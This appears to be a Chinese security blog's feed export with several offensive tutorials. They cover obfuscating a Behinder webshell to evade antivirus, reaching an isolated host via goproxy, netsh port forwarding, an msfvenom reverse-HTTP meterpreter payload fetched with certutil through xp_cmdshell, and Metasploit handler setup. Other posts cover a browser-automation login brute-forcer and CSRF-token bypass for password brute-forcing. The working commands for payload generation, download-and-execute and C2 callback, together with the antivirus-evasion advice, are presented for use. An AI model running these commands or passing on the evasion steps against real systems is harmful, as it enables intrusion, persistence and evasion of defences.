<h3 id="4-开启插件"><a href="#4-开启插件" class="headerlink" title="4.开启插件"></a>4.开启插件</h3><p>加载写好的插件加入到BurpSuite中，并且开启插件（Extender–&gt;Extensions—&gt;Burp Extensions —-&gt;add）。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%88%A9%E7%94%A8Xray+BurpSuite%E8%87%AA%E5%8A%A8%E6%8C%96%E6%8E%98%E5%B8%A6sign%E7%AD%BE%E5%90%8D%E7%9A%84%E6%BC%8F%E6%B4%9E/1611543059_600e3213c1e0106e7f212.png!small" alt="img"></p>
<h3 id="5-结果"><a href="#5-结果" class="headerlink" title="5.结果"></a>5.结果</h3><p>按照上面的原理进行修改后，开始运行，出去吃个饭，回来后，发现XSS漏洞一枚。</p>
<ol>
<li><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%88%A9%E7%94%A8Xray+BurpSuite%E8%87%AA%E5%8A%A8%E6%8C%96%E6%8E%98%E5%B8%A6sign%E7%AD%BE%E5%90%8D%E7%9A%84%E6%BC%8F%E6%B4%9E/1611542973_600e31bdceba42877366e.png!small" alt="img"></li>
</ol>
<h2 id="五、总结："><a href="#五、总结：" class="headerlink" title="五、总结："></a>五、总结：</h2><p>通过本文的介绍，相信大家以后遇到有sign校验的目标时，又多了一种处理的方式。当然也可以利用其他的组合，比如：xray+mitmproxy，burpsuite+scan等，总之方法有很多，适合自己就行，在这里只是抛砖引玉一下。只要是能达到目的就可以。</p>
<p>做为一个渗透测试人员，相信大家手上有很多优秀的渗透测试工具，这些工具的组合，就类似于我们手中的魔方，可以任意组合使用，使用的好，就可以事半功倍。</p>
<h2 id="六、参考文献："><a href="#六、参考文献：" class="headerlink" title="六、参考文献："></a>六、参考文献：</h2><blockquote>
<p>[1]. Xray：<a href="https://docs.xray.cool/#/scenario/burp">https://docs.xray.cool/#/scenario/burp</a><br>[2]. burpSuite：<a href="https://portswigger.net/burp">https://portswigger.net/burp</a><br>[3]. jadx：<a href="https://github.com/skylot/jadx">https://github.com/skylot/jadx</a><br>[4]. jython: <a href="https://www.jython.org/">https://www.jython.org</a></p>
</blockquote>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>BurpSuite</tag>
      </tags>
  </entry>
  <entry>
    <title>冰蝎webshell免杀-傻瓜版</title>
    <url>/posts/627f9de8.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>先说结论，傻瓜式操作免杀，可过D盾、河马、百度、阿里、vt、<a href="https://n.shellpub.com/%E3%80%82">https://n.shellpub.com/。</a></p>
<p>适合新手在没有基础的情况下，过av，快速连上webshell。</p>
<p>当然，这不是长久之计，所以所，还是要自己学习webshell免杀。</p>
<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>冰蝎的马基本都过不了 av，所以说必须是要做一下免杀才能上线。</p>
<p>免杀的思路有以下几个：</p>
<p>基于静态免杀，主要是混淆、加密。</p>
<p>加密的话，需要有点php基础，要会用php的魔术函数、加密函数，有点难度。</p>
<p>而且就算你会修改一点，大概率还是过不了百度、阿里webshell检查。</p>
<p>直接寻求“外援”是最好的。	</p>
<h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><p>所以直接通过第三方php加密网站来加密webshell，这个网站可以解决我们的问题：</p>
<p><a href="https://enphp.djunny.com/">https://enphp.djunny.com/</a></p>
<p>按部就班的上传，勾选能勾的。</p>
<h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>加密网站好像每次加密的效果不一样，如果加密之后d盾警告的话，可以增删改注释…..</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://xz.aliyun.com/t/11149">https://xz.aliyun.com/t/11149</a></p>
<p><a href="https://enphp.djunny.com/">https://enphp.djunny.com/</a></p>
]]></content>
      <categories>
        <category>隐匿技术</category>
      </categories>
      <tags>
        <tag>WebShell</tag>
      </tags>
  </entry>
  <entry>
    <title>利用goproxy http上线不出网主机</title>
    <url>/posts/169a3c2d.html</url>
    <content><![CDATA[<blockquote>
<p>编者荐语：对比了许多不出网上线主机的方式，这个项目的 stars 最高，利用方式最简便。无脑推荐这款。</p>
<p>转载自：<a href="https://mp.weixin.qq.com/s/Ue89ZO01uoztfO4jVAvmCw">https://mp.weixin.qq.com/s/Ue89ZO01uoztfO4jVAvmCw</a></p>
</blockquote>
<p>我们接着上篇文章“<a href="http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247490086&idx=1&sn=14525c41cd3990554b324faec7364e72&chksm=cfa6be35f8d1372348f13148276b848ee0641364c99575233f0b6186f35ce73c5e15328208c1&scene=21#wechat_redirect">利用MSF上线断网主机的思路分享</a>”继续来分享一篇如何使用goproxy http代理方式上线不出网主机的利用姿势，结合上篇文章阅读更佳！！！</p>
<p>项目地址：<a href="https://github.com/snail007/goproxy">https://github.com/snail007/goproxy</a></p>
<h2 id="0x01-测试环境"><a href="#0x01-测试环境" class="headerlink" title="0x01 测试环境"></a><strong>0x01 测试环境</strong></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">攻击机（Kali）：192.168.56.101</span><br><span class="line">受害机1（Web）：192.168.56.102、192.168.186.3 - 双网卡</span><br><span class="line">受害机2（Data）：192.168.186.4 - 断网机</span><br></pre></td></tr></table></figure>



<h2 id="0x02-goproxy-http代理上线MSF-x2F-CS"><a href="#0x02-goproxy-http代理上线MSF-x2F-CS" class="headerlink" title="0x02 goproxy http代理上线MSF&#x2F;CS"></a><strong>0x02 goproxy http代理上线MSF&#x2F;CS</strong></h2><p>我们先将goproxy项目的proxy.exe工具通过中国菜刀上传至目标磁盘可读写目录中，执行以下命令在这台出网主机上开启一个8080端口的HTTP代理供后期与不出网主机进行通讯。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\ProgramData\proxy.exe http -t tcp -p &quot;0.0.0.0:8080&quot; --daemon</span><br></pre></td></tr></table></figure>

<p>![图片](..&#x2F;imgs&#x2F;利用goproxy http上线不出网主机&#x2F;640.png)</p>
<p>0.0.0.0&#x2F;127.0.0.1区别：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0.0.0.0：本机上的所有IPV4地址；</span><br><span class="line">127.0.0.1：环回地址，仅本地接口IP地址；</span><br></pre></td></tr></table></figure>

<p>这一步可直接省略跳过</p>
<p>然后再利用系统自带的netsh命令将这台主机56出网段的HTTP代理8080端口转发至186不出网段的8888端口上，用于后期在MSF监听时设置HTTP代理。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">添加端口转发</span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=192.168.186.3 listenport=8888 connectaddress=192.168.56.102 connectport=8080</span><br><span class="line"></span><br><span class="line">删除端口转发</span><br><span class="line">netsh interface portproxy delete v4tov4 listenaddress=192.168.186.3 listenport=8888</span><br><span class="line"></span><br><span class="line">显示所有端口转发</span><br><span class="line">netsh interface portproxy show all</span><br></pre></td></tr></table></figure>

<p>![图片](..&#x2F;imgs&#x2F;利用goproxy http上线不出网主机&#x2F;640-16545689507214.png)</p>
<p>用msfvenom命令生成个<code>meterpreter_reverse_http</code>载荷文件，需要加上以下几个HTTP代理参数，填入186不出网段内网IP的HTTP代理：<a href="http://192.168.186.3:8080/">http://192.168.186.3:8080</a></p>
<ul>
<li><code>HttpProxyType</code>：代理类型（HTTP）；</li>
<li><code>HttpProxyHost</code>：代理地址（192.168.186.3）；</li>
<li><code>HttpProxyPort</code>：代理端口（8080）；</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter_reverse_http LHOST=192.168.56.101 LPORT=443 HttpProxyType=HTTP HttpProxyHost=192.168.186.3 HttpProxyPort=8080 -f exe &gt; /tmp/stageless.exe</span><br></pre></td></tr></table></figure>

<p>![图片](..&#x2F;imgs&#x2F;利用goproxy http上线不出网主机&#x2F;640-16545689507225.png)</p>
<p>利用中国菜刀的上传&#x2F;下载功能将该文件放至192.168.186.3的Web服务器中供192.168.186.4断网数据库服务器下载，执行以下命令将<code>stageless.exe</code>下载至断网机磁盘中。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EXEC master..xp_cmdshell &#x27;certutil -urlcache -split -f http://192.168.186.3/stageless.exe C:\ProgramData\stageless.exe&#x27;</span><br></pre></td></tr></table></figure>

<p>![图片](..&#x2F;imgs&#x2F;利用goproxy http上线不出网主机&#x2F;640-16545689507226.png)</p>
<p>handler监听模块这里必须也要用<code>meterpreter_reverse_http</code>，配置好相关选项后执行监听，然后在中国菜刀中利用xp_cmdshell组件执行<code>stageless.exe</code>后即可成功上线。‍</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler</span><br><span class="line">msf5 exploit(multi/handler) &gt; set payload windows/x64/meterpreter_reverse_http</span><br><span class="line">msf5 exploit(multi/handler) &gt; set lhost 192.168.56.101</span><br><span class="line">msf5 exploit(multi/handler) &gt; set lport 443</span><br><span class="line">msf5 exploit(multi/handler) &gt; set httpproxytype HTTP</span><br><span class="line">msf5 exploit(multi/handler) &gt; set httpproxyhost 192.168.186.3</span><br><span class="line">msf5 exploit(multi/handler) &gt; set httpproxyport 8080</span><br><span class="line">msf5 exploit(multi/handler) &gt; exploit</span><br><span class="line"></span><br><span class="line">EXEC master..xp_cmdshell &#x27;C:\ProgramData\stageless.exe&#x27;</span><br></pre></td></tr></table></figure>

<p>![图片](..&#x2F;imgs&#x2F;利用goproxy http上线不出网主机&#x2F;640-16545689507227.png)</p>
<p>流量走向如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.186.4-&gt;192.168.186.3(192.168.56.102):8080-&gt;C2</span><br><span class="line">192.168.186.4-&gt;192.168.186.3:8888-&gt;192.168.56.102:8080-&gt;C2</span><br></pre></td></tr></table></figure>

<p><code>httpproxytype、httpproxyhost、httpproxyport</code>这几个高级参数选项在<code>options</code>命令中是看不到的，需要用<code>advanced</code>命令才可看到，如下图。</p>
<p>![图片](..&#x2F;imgs&#x2F;利用goproxy http上线不出网主机&#x2F;640-16545689507238.png)</p>
<p>如需上线至CobaltStrike则可以创建一个新的监听器，有效载荷选择为Beacon HTTP，在HTTP Proxy处填写代理地址：<a href="http://192.168.186.3:8080。">http://192.168.186.3:8080。</a></p>
<p>将在<code>Windows Executable(S)</code>生成的可执行马儿文件上传&#x2F;下载至192.168.186.4断网数据库服务器中执行即可成功上线。</p>
<p>![图片](..&#x2F;imgs&#x2F;利用goproxy http上线不出网主机&#x2F;640-16545689507239.png)</p>
<h2 id="注意事项："><a href="#注意事项：" class="headerlink" title="注意事项："></a><strong>注意事项：</strong></h2><p>利用这种方式上线不出网主机时得注意下，生成MSF文件和设置监听时必须使用stageless Payload，而CS则必须要使用Windows Executable(S)，否则其他马儿即使执行成功也不会上线。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">stager：分阶段，第一阶段申请内存，第二阶段向C2发起请求并接受shellcode执行；</span><br><span class="line">windows/x64/meterpreter/reverse_http</span><br><span class="line"></span><br><span class="line">stageless：不分阶段，生成时就包含了所有文件，可以避免shellcode传输不畅造成目标无法上线；</span><br><span class="line">windows/x64/meterpreter_reverse_http</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>前端登录加密爆破工具编写</title>
    <url>/posts/92baf5af.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>外网入口绝大部分都是靠弱口令、密码爆破攻破。</p>
<p>所以掌握爆破手段十分重要，但是其中大部分的网站又对登录参数进行了加密，有的对用户名进行加密，有的对密码进行加密，这两个都还好，最恶心的是对用户名和密码同时进行加密。</p>
<p>目前主流的解决方案有两种：</p>
<p>第一种是调用加密js文件里面的加密函数，再指定用户名或者密码参数进行爆破。</p>
<p>第二种则是模拟人工登录的情况进行爆破。</p>
<p>两者各有优缺点。</p>
<p>前者缺点是需要一定的js基础，需要找出加密函数的位置，而有些js文件做了一定的混淆，这时候就不一定能找出加密函数了，而且也不适用于对同时加密了用户名和密码的情况进行爆破；优点是爆破速度快。</p>
<p>后者缺点是爆破速度慢，因为需要启用浏览器，占用一定的内存，而且有一定的延迟，但可以通过多线程来稍微改善一下；优点则是通杀一切加密，不管以后的加密形式如何变化，都可以做到通杀。</p>
<p>对比了两者的优缺点，我选择后一种方式来解决这个难题。</p>
<h2 id="需求分析"><a href="#需求分析" class="headerlink" title="需求分析"></a>需求分析</h2><h3 id="1-多线程"><a href="#1-多线程" class="headerlink" title="1.多线程"></a>1.多线程</h3><p>为了弥补模拟爆破速度慢这个致命缺点，多线程功能无疑是十分重要的。毕竟渗透测试的时间是十分宝贵的。</p>
<h3 id="2-代理功能"><a href="#2-代理功能" class="headerlink" title="2.代理功能"></a>2.代理功能</h3><p>因为有些网站会对ip登录次数进行限制，所以可以增加一个简单的代理获取功能和代理设置功能。</p>
<h3 id="3-爆破结果判定"><a href="#3-爆破结果判定" class="headerlink" title="3.爆破结果判定"></a>3.爆破结果判定</h3><p>每个网站登录成功的结果不一定一样，登录结果的判断可以依靠这些：</p>
<ol>
<li>页面长度不一致</li>
<li>关键字，如“登录成功”，“欢迎登录”，“密码错误”等</li>
<li>状态码，200，301等</li>
</ol>
<h3 id="4-验证码识别"><a href="#4-验证码识别" class="headerlink" title="4.验证码识别"></a>4.验证码识别</h3><p>有些网站不但加密了还添加了验证码，但目前我没有遇到这种情况，但为了脚本的强大，可以预留一个调用验证码的接口即可，验证码的识别则可以使用 ddddocr 来识别。</p>
<h3 id="5-可视化图形界面"><a href="#5-可视化图形界面" class="headerlink" title="5.可视化图形界面"></a>5.可视化图形界面</h3><p>这个可以以后开发，因为考虑到以后可能需要将脚本改成GUI，我们在开发的时候可以多想一下怎样的代码才容易改成gui。</p>
<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><h3 id="1-Python3"><a href="#1-Python3" class="headerlink" title="1. Python3"></a><strong>1. Python3</strong></h3><p>Python3 都可以，我这里用的是Python3.7</p>
<h3 id="2-chromedrive"><a href="#2-chromedrive" class="headerlink" title="2. chromedrive"></a><strong>2. chromedrive</strong></h3><p>1）查看 chrome 版本</p>
<p>打开chrome浏览器，在地址栏输入 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chrome://version/</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Untitled/image-20220806224210281.png" alt="image-20220806224210281"></p>
<p>可以看到版本号</p>
<p>2）下载 chromeDrive</p>
<p>打开 <a href="http://chromedriver.storage.googleapis.com/index.html">http://chromedriver.storage.googleapis.com/index.html</a> ，寻找最接近的 chromeDrive 版本</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Untitled/image-20220806224436965.png" alt="image-20220806224436965"></p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/Untitled/image-20220806224448420.png" alt="image-20220806224448420" style="zoom:50%;" />

<p>下载 <strong>chromedrive_win32.zip</strong> ,解压得到 <strong>chromedrive_win32.exe</strong> 。注：虽然电脑和浏览器都是64位的，但这并没有什么影响我们的使用</p>
<p>3）将 chromedrive_win32.exe 复制到 Python 安装路径下的 <strong>Script</strong> 文件夹下</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%89%8D%E7%AB%AF%E7%99%BB%E5%BD%95%E5%8A%A0%E5%AF%86%E7%88%86%E7%A0%B4%E4%B9%8Bselenium/image-20220806225859858.png" alt="image-20220806225859858"></p>
<h3 id="3-selenium"><a href="#3-selenium" class="headerlink" title="3. selenium"></a>3. selenium</h3><p>使用命令安装 <strong>selenium</strong> 如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install -i https://pypi.tuna.tsinghua.edu.cn/simple selenium</span><br></pre></td></tr></table></figure>

<h3 id="4-测试"><a href="#4-测试" class="headerlink" title="4. 测试"></a>4. 测试</h3><p>实例代码，如果能成功运行即代表环境配置没什么问题了：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from selenium import webdriver</span><br><span class="line">from selenium.webdriver.common.by import By</span><br><span class="line">from selenium.webdriver.common.keys import Keys</span><br><span class="line">from selenium.webdriver.support import expected_conditions as EC</span><br><span class="line">from selenium.webdriver.support.wait import WebDriverWait</span><br><span class="line"></span><br><span class="line">browser = webdriver.Chrome()</span><br><span class="line">try:</span><br><span class="line">    browser.get(&#x27;https://www.baidu.com&#x27;)</span><br><span class="line">    input = browser.find_element(By.ID,&#x27;kw&#x27;)</span><br><span class="line">    input.send_keys(&#x27;Python&#x27;)</span><br><span class="line">    input.send_keys(Keys.ENTER)</span><br><span class="line">    wait = WebDriverWait(browser, 10)</span><br><span class="line">    wait.until(EC.presence_of_element_located((By.ID, &#x27;content_left&#x27;)))</span><br><span class="line">    print(browser.current_url)</span><br><span class="line">    print(browser.get_cookies())</span><br><span class="line">    print(browser.page_source)</span><br><span class="line">finally:</span><br><span class="line">    browser.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="正式开发"><a href="#正式开发" class="headerlink" title="正式开发"></a>正式开发</h2><p>代码如下：</p>
<p>想要写成一个通用的密码爆破工具，任重而道远，毕竟登录网站的类型非常之多，可能适用于这个网站，但到了另一个网站，就会有点bug。完成了百分之九十，暂时遇到了一点困难，心力憔悴，身心俱疲，暂时搁置开发，等我重整旗鼓，收复旧山河。</p>
<hr>
<h2 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h2>]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>文章加密测试</title>
    <url>/posts/26ea2038.html</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误" data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">
  <script id="hbeData" type="hbeData" data-hmacdigest="6dbfa75d1a47d8cf472e977742ed9590e3e0c031ab1ace45d5b749ad91a075be">1b693c4938223286468132b2f7068bf6e744a76b0950d4e3028510658c393b65ad83128e9ac1339cc313812b59e57b57fb78cdcf342fe54e4f49cd5dd2ffba8345fdabdf2b5998ccea89a2c6639241cef7fc861e0ce2614348ceda844f450bcac0944d2ccc123065ec9f1bbbf8642ff028ccc06a179f431bebc08c07fee1342ca5eb371c5b7da0db221f76bd1323390e7323cc4ea716bbc8485d5a3f9c16998ce7f56d79d241d24e7c0d864cc1f6ac5215ebc5c1417092fcc6ac9e33b1fcb2352a4227253ae076e03736a70a07335f20eeeefcb41754cbe76591001c468fa6ac41348b7a7ea140817a3425124fc6d7e4ed45bbe76fa3e825f604829b2bb9d12847e0701f38bb49530f9839a3c03f3d59156d47aeea1ee93ed3fbaefdaa0c832e</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-shrink">
      <input class="hbe hbe-input-field hbe-input-field-shrink" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-shrink" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-shrink">请输入密码1234</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/ccc-f/lib/hbe.js"></script><link href="/ccc-f/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
  </entry>
  <entry>
    <title>反CSRF爆破的三种姿势</title>
    <url>/posts/877391b0.html</url>
    <content><![CDATA[<blockquote>
<p>荐语：现在大部分的网站都有token参数，让我们举步维艰，难以挖掘漏洞，如何反csrf爆破十分重要。</p>
<p>反csrf爆破使用的场景有密码爆破、数据包的重放、fuzzing等</p>
<p>转载自：<a href="https://xz.aliyun.com/t/11419">https://xz.aliyun.com/t/11419</a></p>
</blockquote>
<h1 id="姿势1-CSRF-Token-Tracker"><a href="#姿势1-CSRF-Token-Tracker" class="headerlink" title="姿势1:CSRF Token Tracker"></a><strong>姿势1:CSRF Token Tracker</strong></h1><p>CSRF Token Tracker是个插件,可以在BApp Store下载安装</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%8F%8DCSRF%E7%88%86%E7%A0%B4%E7%9A%84%E4%B8%89%E7%A7%8D%E5%A7%BF%E5%8A%BF/640.png" alt="图片"></p>
<p>这种方式可以说是最简单的,但是不适用姿势2和姿势3中的案例现有一个请求参数是user_token</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%8F%8DCSRF%E7%88%86%E7%A0%B4%E7%9A%84%E4%B8%89%E7%A7%8D%E5%A7%BF%E5%8A%BF/640-166418400685962.png" alt="图片"></p>
<p>只需要在插件中添加<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%8F%8DCSRF%E7%88%86%E7%A0%B4%E7%9A%84%E4%B8%89%E7%A7%8D%E5%A7%BF%E5%8A%BF/640-166418400685963.png" alt="图片"></p>
<p>注意这里有个坑(搞了好久)比如你想在repeater模块测试一下重新发送请求会不会修改密码<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%8F%8DCSRF%E7%88%86%E7%A0%B4%E7%9A%84%E4%B8%89%E7%A7%8D%E5%A7%BF%E5%8A%BF/640-166418400686064.png" alt="图片"></p>
<p>发现返回的结果仍然是302这里是需要有一个有效的,没有使用过的user_token去请求的!然后再去重放请求包就都会自动更新token了总结一句就是你第一次用有效的token重放请求包就永远有效(自动更新token了)你第一次用无效的token重放请求包就永远无效</p>
<h1 id="姿势2-定义宏"><a href="#姿势2-定义宏" class="headerlink" title="姿势2:定义宏"></a><strong>姿势2:定义宏</strong></h1><p>在这个案例中使用CSRF Token Tracker无法成功自动更新token</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%8F%8DCSRF%E7%88%86%E7%A0%B4%E7%9A%84%E4%B8%89%E7%A7%8D%E5%A7%BF%E5%8A%BF/640-166418400686065.png" alt="图片"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%8F%8DCSRF%E7%88%86%E7%A0%B4%E7%9A%84%E4%B8%89%E7%A7%8D%E5%A7%BF%E5%8A%BF/640-166418400686066.png" alt="图片"></p>
<p>开始定义宏</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%8F%8DCSRF%E7%88%86%E7%A0%B4%E7%9A%84%E4%B8%89%E7%A7%8D%E5%A7%BF%E5%8A%BF/640-166418400686167.png" alt="图片"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%8F%8DCSRF%E7%88%86%E7%A0%B4%E7%9A%84%E4%B8%89%E7%A7%8D%E5%A7%BF%E5%8A%BF/640-166418400686168.png" alt="图片"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%8F%8DCSRF%E7%88%86%E7%A0%B4%E7%9A%84%E4%B8%89%E7%A7%8D%E5%A7%BF%E5%8A%BF/640-166418400686169.png" alt="图片"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%8F%8DCSRF%E7%88%86%E7%A0%B4%E7%9A%84%E4%B8%89%E7%A7%8D%E5%A7%BF%E5%8A%BF/640-166418400686170.png" alt="图片"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%8F%8DCSRF%E7%88%86%E7%A0%B4%E7%9A%84%E4%B8%89%E7%A7%8D%E5%A7%BF%E5%8A%BF/640-166418400686171.png" alt="图片"></p>
<p>一路OK回到这里</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%8F%8DCSRF%E7%88%86%E7%A0%B4%E7%9A%84%E4%B8%89%E7%A7%8D%E5%A7%BF%E5%8A%BF/640-166418400686172.png" alt="图片"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%8F%8DCSRF%E7%88%86%E7%A0%B4%E7%9A%84%E4%B8%89%E7%A7%8D%E5%A7%BF%E5%8A%BF/640-166418400686173.png" alt="图片"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%8F%8DCSRF%E7%88%86%E7%A0%B4%E7%9A%84%E4%B8%89%E7%A7%8D%E5%A7%BF%E5%8A%BF/640-166418400686174.png" alt="图片"></p>
<p>不懂就选择1,在所有请求前都运行宏</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%8F%8DCSRF%E7%88%86%E7%A0%B4%E7%9A%84%E4%B8%89%E7%A7%8D%E5%A7%BF%E5%8A%BF/640-166418400686275.png" alt="图片"></p>
<p>来到repeater模块重新发送请求就不会说非法的csrftoken</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%8F%8DCSRF%E7%88%86%E7%A0%B4%E7%9A%84%E4%B8%89%E7%A7%8D%E5%A7%BF%E5%8A%BF/640-166418400686276.png" alt="图片">来看日志发生了什么</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%8F%8DCSRF%E7%88%86%E7%A0%B4%E7%9A%84%E4%B8%89%E7%A7%8D%E5%A7%BF%E5%8A%BF/640-166418400686277.png" alt="图片"></p>
<p>我们使用repeater重放了登录的请求,也就是图中第71个请求宏帮我们自动进行了了第70个请求获取了新的token让第71个带着新的token去登录</p>
<h1 id="姿势3-宏-Extractor"><a href="#姿势3-宏-Extractor" class="headerlink" title="姿势3:宏+Extractor"></a><strong>姿势3:宏+Extractor</strong></h1><p>在这个案例中前两种姿势均无效下载安装插件</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%8F%8DCSRF%E7%88%86%E7%A0%B4%E7%9A%84%E4%B8%89%E7%A7%8D%E5%A7%BF%E5%8A%BF/640-166418400686278.png" alt="图片"></p>
<p>先看下两个请求包第一个请求包就是获取token的</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%8F%8DCSRF%E7%88%86%E7%A0%B4%E7%9A%84%E4%B8%89%E7%A7%8D%E5%A7%BF%E5%8A%BF/640-166418400686279.png" alt="图片"></p>
<p>第二个就是带着token去访问</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%8F%8DCSRF%E7%88%86%E7%A0%B4%E7%9A%84%E4%B8%89%E7%A7%8D%E5%A7%BF%E5%8A%BF/640-166418400686280.png" alt="图片"></p>
